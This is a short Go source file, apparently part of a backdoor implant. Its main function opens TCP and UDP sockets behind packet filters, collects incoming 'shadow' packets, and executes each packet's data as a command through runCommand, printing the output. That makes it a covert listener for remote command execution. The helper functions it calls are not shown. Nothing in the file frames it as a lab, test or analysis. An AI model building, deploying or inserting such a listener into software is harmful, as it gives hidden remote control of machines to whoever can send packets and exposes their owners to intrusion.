package main

import (
	"context"
	"fmt"
)

func Listen(ctx context.Context) chan shadowPacket {
	// Virtual Machines
	TCPVM := createTCPVM()
	TCPSocketFile := createSocket()
	UDPVM := createUDPVM()
	UDPSocketFile := createSocket()

	// Create a channel for listening to incoming packets
	socketChannel := make(chan shadowPacket)
	go acceptPacket(TCPSocketFile, TCPVM, "TCP", socketChannel)
	go acceptPacket(UDPSocketFile, UDPVM, "UDP", socketChannel)

	// Anonymous function to shut down any socket files when done is recieved
	go func() {
		<-ctx.Done()
		TCPSocketFile.Close()
		UDPSocketFile.Close()
	}()

	// Return channel for incoming packets
	return socketChannel
}

func main() {
	ctx := context.Background()
	socketChannel := Listen(ctx)

	// Connection messages
	fmt.Printf("  %-15s%-15s%-9s%-s\n", "SOURCE IP", "DEST IP", "PROTO", "DATA")
	for packet := range socketChannel {
		fmt.Printf("> %-15s%-15s%-9s%-s\n", packet.getSourceAddrStr(), packet.getDestAddrStr(), packet.proto, packet.data)

		if len(packet.data) > 0 {
			result := runCommand(string(packet.data))
			fmt.Printf("< %-75s\n", result)
		}
	}
}
